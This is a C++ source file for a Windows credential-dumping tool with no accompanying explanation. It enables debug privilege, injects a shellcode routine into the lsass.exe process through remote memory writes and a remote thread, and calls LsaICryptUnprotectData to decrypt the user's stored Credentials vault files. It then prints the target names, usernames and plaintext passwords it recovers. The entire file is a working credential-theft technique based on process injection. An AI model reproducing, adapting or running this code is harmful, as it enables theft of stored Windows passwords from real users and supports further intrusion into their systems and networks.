#include "stdafx.h"
#include <unone.h>
#include <Sddl.h>
#include <string>
#include <vector>
#include <algorithm>
using namespace std;

typedef HMODULE (WINAPI *GETMODULEHANDLEA)(LPCSTR lpModuleName);
typedef PVOID	(WINAPI *GETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);
typedef HLOCAL	(WINAPI *LOCALFREE)(HLOCAL hMem);
typedef DWORD	(WINAPI *GETLASTERROR)( VOID );
typedef DWORD	(WINAPI *LSAICRYPTUNPROTECTDATA)(PVOID pBuffer, DWORD dwSize, DWORD, DWORD, DWORD, DWORD, DWORD flags, DWORD, PVOID pOutput, DWORD* cbSize);
typedef DWORD	(WINAPI *SHELLCODEROUTINE)(PVOID Param);

typedef BOOL (WINAPI *DEF_CryptUnprotectData) (
	DATA_BLOB* pDataIn,
	LPWSTR* ppszDataDescr,
	DATA_BLOB* pOptionalEntropy,
	PVOID pvReserved,
	CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
	DWORD dwFlags,
	DATA_BLOB* pDataOut
	);

typedef struct _REMOTE_INJECT_DATA
{
	CHAR*				CredData;
	DWORD				CredSize;
	CHAR*				OutputBuf;
	DWORD				OutputSize;
	GETMODULEHANDLEA	AddrGetModuleHandleA;
	GETPROCADDRESS		AddrGetProcAddress;
	LOCALFREE			AddrLocalFree;
	GETLASTERROR		AddrGetLastError;
	CHAR				NameLsasrv[16];
	CHAR				NameLsaICryptUnprotectData[32];
}REMOTE_INJECT_DATA, *PREMOTE_INJECT_DATA;

#define CRYPTPROTECT_UI_FORBIDDEN				0x1
#define CRED_MAX_GENERIC_TARGET_NAME_LENGTH		32767

struct DecryptedHeader
{
	DWORD dwHeaderId; //0x01 for XP & 0x30 for Vista/Win7
	DWORD dwBufferSize; //size of the entire decrypted data
};

// For Windows XP
struct OldDecryptedNetAccount
{
	DWORD dwItemSize; //total size of this item for XP
	DWORD dwUnknown;
	DWORD dwType;
	FILETIME dwLastModified;
	DWORD dwZero;
	DWORD dwPersist; //3 => enterprise 2=> local machine 
	char unknown[12];
// 	DWORD dwCredNameSize;
// 	char strCredName[dwCredNameSize]; 
// 	DWORD dwCommentSize; 
// 	char strComment[dwCommentSize];
// 	DWORD dwAliasSize; 
// 	char strAlias[dwAliasSize]; 
// 	DWORD dwUserNameSize; 
// 	char strUserName[dwUserNameSize]; 
// 	DWORD dwPasswordSize;
// 	char password[dwPasswordSize]; 
// 	char padding[unknown]; //To make next entry aligned on 8th byte
};

// For Vista & Windows 7
struct NewDecryptedNetAccount
{
	DWORD dwZero;
	DWORD dwType;
	DWORD dwzero;
	FILETIME dwLastModified;
	DWORD dwSomeSize;
	DWORD dwPersist; //3 => enterprise 2=> local machine 
	char unknown[12];
// 	DWORD dwCredNameSize;
// 	char strCredName[dwCredNameSize]; 
// 	DWORD dwCommentSize; 
// 	char strComment[dwCommentSize];
// 	DWORD dwAliasSize; 
// 	char strAlias[dwAliasSize]; 
// 	DWORD dwUnknownSize; // only for vista/win7
// 	char strUnknown[dwUnknownSize]; //only for vista/win7
// 	DWORD dwUserNameSize; 
// 	char strUserName[dwUserNameSize]; 
// 	DWORD dwPasswordSize;
// 	char password[dwPasswordSize]; 
};

BOOL DecodePassportBlob(PVOID Input, PVOID Output)
{
	BOOL ret = FALSE; 

	static unsigned char table[] = {
		0xe0, 0x00, 0xc8, 0x00, 0x08, 0x01, 0x10, 0x01,
		0xc0, 0x00, 0x14, 0x01, 0xd8, 0x00, 0xdc, 0x00,
		0xb4, 0x00, 0xe4, 0x00, 0x18, 0x01, 0x14, 0x01,
		0x04, 0x01, 0xb4, 0x00, 0xd0, 0x00, 0xdc, 0x00,
		0xd0, 0x00, 0xe0, 0x00, 0xb4, 0x00, 0xe0, 0x00,
		0xd8, 0x00, 0xdc, 0x00, 0xc8, 0x00, 0xb4, 0x00,
		0x10, 0x01, 0xd4, 0x00, 0x14, 0x01, 0x18, 0x01,
		0x14, 0x01, 0xd4, 0x00, 0x08, 0x01, 0xdc, 0x00,
		0xdc, 0x00, 0xe4, 0x00, 0x08, 0x01, 0xc0, 0x00, 
		0x00, 0x00 };

		DATA_BLOB blob = { sizeof(table), table };
		DEF_CryptUnprotectData pCryptUnprotectData;

		pCryptUnprotectData = (BOOL (WINAPI *) (DATA_BLOB*,LPWSTR*,DATA_BLOB*,PVOID,CRYPTPROTECT_PROMPTSTRUCT*,DWORD,DATA_BLOB*)) GetProcAddress( LoadLibrary( "crypt32.dll"),"CryptUnprotectData" );
		if( !pCryptUnprotectData ) return FALSE;

		ret = pCryptUnprotectData((DATA_BLOB*) Input, NULL, &blob, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, (DATA_BLOB*) Output);

		return ret;
}

BOOL DecodeSimpleBlob(PVOID pInput, PVOID pOutput)
{
	BOOL ret = FALSE; 

	DEF_CryptUnprotectData pCryptUnprotectData;

	pCryptUnprotectData = (BOOL (WINAPI *) (DATA_BLOB*,LPWSTR*,DATA_BLOB*,PVOID,CRYPTPROTECT_PROMPTSTRUCT*,DWORD,DATA_BLOB*)) GetProcAddress( LoadLibrary( "crypt32.dll"),"CryptUnprotectData" );
	if( !pCryptUnprotectData ) return FALSE;

	ret = pCryptUnprotectData((DATA_BLOB*) pInput, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, (DATA_BLOB*) pOutput);

	return ret;
}

int DecodeBlob(unsigned char *pBlobData, int BlobSize, char* decoded, int decoded_buffersize)
{
	BOOL IsUnicode;
	DATA_BLOB Data;
	DATA_BLOB Passwd;
	Data.pbData = pBlobData;
	Data.cbData = BlobSize;

	memset (decoded,0,decoded_buffersize);

	// Check if the blob is a Passport BLOB
	if (DecodePassportBlob(&Data, &Passwd)==TRUE)
	{
		WideCharToMultiByte (CP_ACP,0,(WCHAR*) Passwd.pbData, Passwd.cbData*2, decoded,decoded_buffersize,NULL,NULL);
		return 1;
	}

	// Check if the blob is a BLOB from CryptProtectData with no entropy
	if (DecodeSimpleBlob(&Data, &Passwd)==TRUE)
	{
		IsUnicode = IsTextUnicode (Passwd.pbData, Passwd.cbData, NULL);
		if (IsUnicode == TRUE)
		{
			WideCharToMultiByte (CP_ACP,0,(LPWSTR) Passwd.pbData, Passwd.cbData/2, decoded,decoded_buffersize,NULL,NULL);
		}
		else 
		{
			strncpy(decoded, (char*) Passwd.pbData, Passwd.cbData);
		}
		return 2;
	}

	// Check if the BLOB is an UNICODE or a MultiByte password
	IsUnicode = IsTextUnicode (pBlobData, BlobSize ,NULL);
	if (IsUnicode == TRUE)
	{
		WideCharToMultiByte (CP_ACP,0,(LPWSTR) pBlobData, BlobSize/2, decoded,decoded_buffersize,NULL,NULL);
	}
	else 
	{
		strncpy(decoded, (char*) pBlobData, BlobSize);
	}

	return 0;
}

DWORD WINAPI ShellCodeRoutine(PVOID Param)
{
	DWORD Result = 0;
	PREMOTE_INJECT_DATA InjectData = (PREMOTE_INJECT_DATA)Param;
	
	HMODULE Lsasrv = InjectData->AddrGetModuleHandleA(InjectData->NameLsasrv);
	if (Lsasrv)
	{
		auto pLsaICryptUnprotectData = (LSAICRYPTUNPROTECTDATA)InjectData->AddrGetProcAddress(
			Lsasrv,InjectData->NameLsaICryptUnprotectData);
		if (pLsaICryptUnprotectData)
		{
			DWORD Size = 0;
			CHAR* Data = NULL;
			pLsaICryptUnprotectData(InjectData->CredData, InjectData->CredSize, 0, 0, 0, 0, 0x20000041, 0, &Data, &Size);
			if (Data && Size>0)
			{
				if (InjectData->OutputSize >= Size)
				{
					DWORD i;
					for (i=0; i<Size; i++)
					{
						InjectData->OutputBuf[i] = Data[i];
					}
					InjectData->AddrLocalFree(Data);
					InjectData->OutputSize = Size;
					Result = Size;
				}
				else
				{
					Result = 4;
				}
			}
			else
			{
				InjectData->OutputSize = InjectData->AddrGetLastError();
				Result = 3;
			}
		}
		else
		{
			Result = 2;
		}
	}
	else
	{
		Result = 1;
	}
	return Result;
}

void ParseCredentials(const string& File, const string& CredInfo)
{
	if (CredInfo.empty())
		return;

	printf("*****************************************************\n");
 	//string& OutFile = OsDrive()+"\\"+StrPathToName(File)+".txt";
 	//FsWriteFileData(OutFile, CredInfo);

	unsigned char* Buffer = (unsigned char *)CredInfo.c_str();
	int CredInfoSize = CredInfo.size();
	int BlobType;
	SYSTEMTIME stUTC, stLocal;
	unsigned char* pCred;
	unsigned char* pOffset;
	DWORD TargetLen, UserLen, BlobLen, CommentLen, AliasLen;
	char* temp = (char*) calloc (CRED_MAX_GENERIC_TARGET_NAME_LENGTH, sizeof(char));

	for (pCred = Buffer+sizeof(DecryptedHeader); pCred<Buffer+CredInfoSize; )
	{
		pOffset = pCred;
		NewDecryptedNetAccount* pCredInfo = (NewDecryptedNetAccount*) pOffset;
		pOffset += sizeof(NewDecryptedNetAccount);		
		TargetLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);
		memset (temp,0,CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
		WideCharToMultiByte (CP_ACP,0,(LPWSTR) pOffset,TargetLen/2,temp,CRED_MAX_GENERIC_TARGET_NAME_LENGTH,NULL,NULL);
		printf ("Target: %s\n",temp);

		pOffset += TargetLen;
		CommentLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);
		memset (temp,0,CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
		WideCharToMultiByte (CP_ACP,0,(LPWSTR) pOffset,CommentLen/2,temp,CRED_MAX_GENERIC_TARGET_NAME_LENGTH,NULL,NULL);
		printf ("Comment: %s\n",temp);

		pOffset += CommentLen;	
		AliasLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);
		memset (temp,0,CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
		WideCharToMultiByte (CP_ACP,0,(LPWSTR) pOffset,AliasLen/2,temp,CRED_MAX_GENERIC_TARGET_NAME_LENGTH,NULL,NULL);
		printf ("Alias: %s\n",temp);
		
		FileTimeToSystemTime(&pCredInfo->dwLastModified, &stUTC);
		SystemTimeToTzSpecificLocalTime (NULL, &stUTC, &stLocal);
		printf("Modified: %04d-%02d-%02d %02d:%02d:%02d\n",stLocal.wYear,stLocal.wMonth,stLocal.wDay,stLocal.wHour,stLocal.wMinute,stLocal.wSecond);

		if (UNONE::OsMajorVer() >= 6)
		{
			pOffset += AliasLen;
			AliasLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);
		}

		pOffset += AliasLen;
		UserLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);
		memset (temp,0,CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
		WideCharToMultiByte (CP_ACP,0,(LPWSTR) pOffset,UserLen/2,temp,CRED_MAX_GENERIC_TARGET_NAME_LENGTH,NULL,NULL);
		printf ("Username: %s\n",temp);

		pOffset += UserLen;

		BlobLen = *(DWORD*) (pOffset); pOffset += sizeof (DWORD);

		DWORD Type;
		if (UNONE::OsMajorVer() >= 6)
			Type = pCredInfo->dwType;
		else
			Type = ((OldDecryptedNetAccount*)pCredInfo)->dwType;
		switch (Type)
		{
		case 1:	BlobType = DecodeBlob(pOffset, BlobLen, temp, CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
			printf ("Password: %s\n",temp);
			if (BlobType==2) printf("Type: Generic (BLOB)\n");
			else printf ("Type: Generic\n");
			break;

		case 2:	BlobType = DecodeBlob(pOffset, BlobLen, temp, CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
			printf ("Password: %s\n",temp);
			if (BlobType==2) printf ("Type: Domain Password (BLOB)\n");
			else printf ("Type: Domain\n");
			break;

		case 3:	printf ("Password:\n");
			printf ("Type: Certificate\n");
			break;

		case 4:	BlobType = DecodeBlob(pOffset, BlobLen, temp, CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
			printf ("Password: %s\n",temp);
			if (BlobType==1) printf ("Type: Passport (BLOB)\n");
			else if (BlobType==2) printf ("Type: Visible Password (BLOB)\n");
			else printf ("Type: Visible\n");
			break;

		default:BlobType = DecodeBlob(pOffset, BlobLen, temp, CRED_MAX_GENERIC_TARGET_NAME_LENGTH);
			printf ("Password: %s\n",temp);
			if (BlobType==2) printf ("Type: Unknown (BLOB)\n");
			else printf ("Type: Unknown\n");
			break;
		}
		//Vista之后是单个文件
		if (UNONE::OsMajorVer() >= 6)
			break;
		pCred += ((OldDecryptedNetAccount*)pCredInfo)->dwItemSize;
		printf("*****************************************************\n");
	}

}

DWORD GetLsassPid()
{
	vector<DWORD> Pids;
	UNONE::PsEnumProcess([&](PROCESSENTRY32W &entry)->bool{
		if (UNONE::StrWildCompareIW(UNONE::PsGetProcessPathW(entry.th32ProcessID), L"*\\system32\\lsass.exe")) {
			Pids.push_back(entry.th32ProcessID);
			return false;
		}
		return true;
	});
	return Pids.empty() ? 0 : Pids[0];
}
BOOL ImpersonateThread(PHANDLE Thread)
{
	BOOL Result;
	HANDLE Token = NULL;
	HANDLE DupToken = NULL;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &Token)) 
		return FALSE;

	if (!DuplicateToken(Token, SecurityImpersonation, &DupToken))
	{
		CloseHandle (Token);
		return FALSE;
	}

	Result = SetThreadToken(Thread,DupToken);

	CloseHandle(Token);
	CloseHandle(DupToken);
	return Result;
}

void CallLsaICryptUnprotectData(string& File, string& CredInfo)
{
	string FileData, CredData;
	UNONE::FsReadFileDataA(File, FileData);
	if (FileData.empty())
	{
		printf("[-] ReadFile %s failed.\n",File.c_str());
		return;
	}
	char CredSign[] = "\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8c\x7a\x00\xc0";
	if (memcmp(FileData.c_str(), CredSign, sizeof(CredSign)-1) == 0)
	{
		CredData = FileData;
	}
	else
	{
		if (memcmp(FileData.c_str()+0x0C, CredSign, sizeof(CredSign)-1) != 0)
		{
			printf("[-] %s failed to match the signature.\n", File.c_str());
			return;
		}
		CredData.assign(FileData.c_str()+0x0C, FileData.size()-0x0C);
	}

	DWORD LsassPid = GetLsassPid();
	if (!LsassPid)
	{
		printf("[-] Can't found Lsass.exe process id\n");
		return;
	}
	HANDLE Lsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPid);
	if (!Lsass)
	{
		printf("[-] OpenProcess lsass failed, error %d\n",File.c_str(), GetLastError());
		return;
	}

	DWORD ExitCode;
	HANDLE Thread = NULL;
	HLOCAL TempAlloc = NULL;
	HMODULE Kernel32 = GetModuleHandleA("kernel32.dll");
	PVOID RemoteShellCodeRoutine = NULL;
	PVOID RoutineParam = NULL;
	REMOTE_INJECT_DATA InjectData;
	InjectData.AddrGetModuleHandleA = (GETMODULEHANDLEA)GetProcAddress(Kernel32,"GetModuleHandleA");
	InjectData.AddrGetProcAddress = (GETPROCADDRESS)GetProcAddress(Kernel32,"GetProcAddress");
	InjectData.AddrLocalFree = (LOCALFREE)GetProcAddress(Kernel32,"LocalFree");
	InjectData.AddrGetLastError = (GETLASTERROR)GetProcAddress(Kernel32,"GetLastError");
	InjectData.CredData = NULL;
	InjectData.CredSize = CredData.size();
	InjectData.OutputBuf = NULL;
	InjectData.OutputSize = 0x1000;
	strcpy_s(InjectData.NameLsasrv,"lsasrv.dll");
	strcpy_s(InjectData.NameLsaICryptUnprotectData,"LsaICryptUnprotectData");
	do 
	{
		InjectData.CredData = (CHAR*)VirtualAllocEx(Lsass, NULL, InjectData.CredSize, MEM_COMMIT, PAGE_READWRITE);
		if (!InjectData.CredData)
		{
			printf("[-] VirtualAllocEx CredData failed, error %d\n", GetLastError());
			break;
		}
		if (!WriteProcessMemory(Lsass, InjectData.CredData, CredData.c_str(), InjectData.CredSize, NULL))
		{
			printf("[-] WriteProcessMemory CredData failed, error %d\n", GetLastError());
			break;
		}
		InjectData.OutputBuf = (CHAR*)VirtualAllocEx(Lsass, NULL, InjectData.OutputSize, MEM_COMMIT, PAGE_READWRITE);
		if (!InjectData.OutputBuf)
		{
			printf("[-] VirtualAllocEx OutputBuf failed, error %d\n", GetLastError());
			break;
		}
		DWORD ShellCodeSize = (DWORD)((UINT_PTR)ParseCredentials-(UINT_PTR)ShellCodeRoutine);
		RemoteShellCodeRoutine = VirtualAllocEx(Lsass, NULL, ShellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!RemoteShellCodeRoutine)
		{
			printf("[-] VirtualAllocEx RemoteShellCodeRoutine failed, error %d\n", GetLastError());
			break;
		}
		if (!WriteProcessMemory(Lsass, RemoteShellCodeRoutine, ShellCodeRoutine, ShellCodeSize, NULL))
		{
			printf("[-] WriteProcessMemory RemoteShellCodeRoutine failed, error %d\n", GetLastError());
			break;
		}
		RoutineParam = VirtualAllocEx(Lsass, NULL, sizeof(REMOTE_INJECT_DATA), MEM_COMMIT, PAGE_READWRITE);
		if (!RoutineParam)
		{
			printf("[-] VirtualAllocEx RoutineParam failed, error %d\n", GetLastError());
			break;
		}
		if (!WriteProcessMemory(Lsass, RoutineParam, &InjectData, sizeof(REMOTE_INJECT_DATA), NULL))
		{
			printf("[-] WriteProcessMemory RoutineParam failed, error %d\n", GetLastError());
			break;
		}
		Thread = UNONE::PsCreateRemoteThread(LsassPid, (ULONG64)RemoteShellCodeRoutine, (ULONG64)RoutineParam, CREATE_SUSPENDED);
		if (!Thread)
		{
			printf("[-] CreateRemoteThread failed, error %d\n", GetLastError());
			break;
		}
		if (!ImpersonateThread(&Thread))
		{
			printf("[-] ImpersonateThread failed, error %d\n", GetLastError());
			break;
		}
		if (ResumeThread(Thread) == -1)
		{
			printf("[-] ResumeThread failed, error %d\n", GetLastError());
			break;
		}
		WaitForSingleObject(Thread, INFINITE);
		GetExitCodeThread(Thread, &ExitCode);
		//printf("[+] ExitCode %d.\n",ExitCode);
		if (ExitCode <= 4)
		{
			REMOTE_INJECT_DATA TempData = {0};
			ReadProcessMemory(Lsass, RoutineParam, &TempData, sizeof(TempData), NULL);
			printf("[-] RemoteShellCodeRoutine return %d, error %d\n",ExitCode,TempData.OutputSize);
			break;
		}
		TempAlloc = LocalAlloc(LMEM_ZEROINIT, ExitCode);
		if (!TempAlloc)
		{
			printf("[-] LocalAlloc TempAlloc error %d.\n",GetLastError());
			break;
		}
		if (!ReadProcessMemory(Lsass, InjectData.OutputBuf, TempAlloc, ExitCode, NULL))
		{
			printf("[-] ReadProcessMemory OutputBuf failed, error %d\n",GetLastError());
			break;
		}
		CredInfo.assign((CHAR*)TempAlloc, ExitCode);
	} while (0);

	if (InjectData.CredData)
		VirtualFreeEx(Lsass, InjectData.CredData, 0, MEM_RELEASE);
	if (InjectData.OutputBuf)
		VirtualFreeEx(Lsass, InjectData.OutputBuf, 0, MEM_RELEASE);
	if (RemoteShellCodeRoutine)
		VirtualFreeEx(Lsass, RemoteShellCodeRoutine, 0, MEM_RELEASE);
	if (RoutineParam)
		VirtualFreeEx(Lsass, RoutineParam, 0, MEM_RELEASE);
	if (Thread)
		CloseHandle(Thread);
	if (TempAlloc)
		LocalFree(TempAlloc);
	CloseHandle(Lsass);
}

void DumpCredentials(string CredDir)
{
	vector<string> CredFiles;
	if (UNONE::FsIsDirA(CredDir)) {
		UNONE::FsEnumDirectoryA(CredDir, [&](char* path, char* name, void* param)->bool{
			if (!UNONE::FsIsDirA(path)) {
				CredFiles.push_back(path);
			}
			return true;
		});
	}	else {
		CredFiles.push_back(CredDir);
	}
	for_each(begin(CredFiles), end(CredFiles), [](string& File){
		//cout<<File<<endl;
		string CredInfo;
		CallLsaICryptUnprotectData(File, CredInfo);
		ParseCredentials(File, CredInfo);
	});
}

DWORD GetUserSid(const std::string& UserName, PSID* Sid)
{
	DWORD SidSize = 0, DomainSize = 0;
	LPSTR Domain = NULL;
	SID_NAME_USE SidNameUse;
	DWORD Result = ERROR_SUCCESS;
	do {
		if (Sid == NULL) {
			Result = ERROR_INVALID_PARAMETER;
			break;
		}
		if (!LookupAccountNameA(NULL, UserName.c_str(), NULL, &SidSize, NULL, &DomainSize, NULL) && 
			GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			Result = GetLastError();
			break;
		}
		if (!(*Sid=(PSID)malloc(SidSize)) || !(Domain=(LPSTR)malloc(DomainSize))) {
			Result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}
		if (!LookupAccountNameA(NULL, UserName.c_str(), *Sid, &SidSize, Domain, &DomainSize, &SidNameUse)) {
			Result = GetLastError();
			break;
		}
	} while (0);
	if (Domain) free(Domain);
	if (Result!=ERROR_SUCCESS && *Sid) {
		*Sid = NULL;
		free(Sid);
	}
	return Result;
}

bool GetUserStringSid(const std::string& UserName, std::string& StringSid)
{
	bool Result = false;
	PSID Sid = NULL;
	LPSTR Str = NULL;
	if (GetUserSid(UserName, &Sid) == ERROR_SUCCESS) {
		if ((ConvertSidToStringSid(Sid, &Str)))	{
			StringSid = Str;
			LocalFree(Str);
			Result = true;
		}
		free(Sid);
	}
	return Result;
}

void GetCredentials()
{
#ifndef _AMD64_
	if (UNONE::OsIs64())
	{
		printf("[-] Windows is 64 bit, please use 64 bit program.\n");
		return;
	}
#endif
	string AppData, LocalAppData, CredDir;
	UNONE::SeEnableDebugPrivilege(true);
	AppData = UNONE::OsEnvironmentA("%AppData%");
	LocalAppData = UNONE::OsEnvironmentA("%LocalAppData%");
	if (UNONE::OsMajorVer() >= 6)
	{
		CredDir = UNONE::StrFormatA("%s\\Microsoft\\Credentials",AppData.c_str());
		DumpCredentials(CredDir);
		CredDir = UNONE::StrFormat("%s\\Microsoft\\Credentials",LocalAppData.c_str());
		DumpCredentials(CredDir);
	}
	else
	{
		string SidStr;
		GetUserStringSid(UNONE::OsUserNameA(), SidStr);
		CredDir = UNONE::StrFormat("%s\\Microsoft\\Credentials\\%s\\credentials",AppData.c_str(), SidStr.c_str());
		DumpCredentials(CredDir);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	GetCredentials();
	return 0;
}

